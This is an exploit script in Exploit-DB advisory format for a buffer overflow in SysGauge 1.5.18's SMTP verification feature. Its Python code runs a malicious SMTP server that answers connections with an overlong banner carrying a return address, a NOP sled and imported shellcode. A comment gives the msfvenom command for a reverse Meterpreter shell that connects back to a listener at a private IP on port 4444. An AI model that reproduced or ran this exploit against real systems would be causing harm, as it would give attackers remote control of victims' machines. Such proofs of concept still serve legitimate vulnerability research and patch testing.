# Exploit Title: SysGauge 1.5.18 â€“ buffer overflow in SMTP connection verification function leads to code execution
# Date: 2017-02-28
# Exploit Author: Peter Baris
# Vendor Homepage: http://www.saptech-erp.com.au
# Software Link: http://www.sysgauge.com/setups/sysgauge_setup_v1.5.18.exe
# Version: 1.5.18
# Tested on: Windows Server 2008 R2 Standard x64
# CVE : requested

# The shellcode has to be split into 2 pieces  for the exploit to work and has to be placed at the offsets like shown below.
# The 1st part can be max. 236 bytes 
# The 2nd part can be max. 76  (leave at least 4 NOPs)


import sys
import socket
import time
import socket
from payload import buf
import struct
def shell_attack(target_machine, target_port):
	try:
		jmp = b"\x5e\x63\x27\x65"
		nops = b"\x90"*8


		# reverse meterpreter shell 306 bytes long bad chars \x00\x0a\x0b\x20 
		#IP: 192.168.198.128, PORT: 4444
		# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.198.128 LPORT=4444 -f c -b \x00\x0a\x0d\x20 --smallest

		

		
		buffer = b"A"*176+b"A"*2+jmp+b"B"*12+nops+buf
		port = target_port
		
		s = socket.socket()
		ip = target_machine            
		s.bind((ip, port))            
		s.listen(5)                    

		
		
		
		
		while True:
			conn, addr = s.accept()     
			conn.send(b'220 '+buffer+b'ESMTP Sendmail \r\n')
			conn.close()
	except:
		print("Not connected")		
		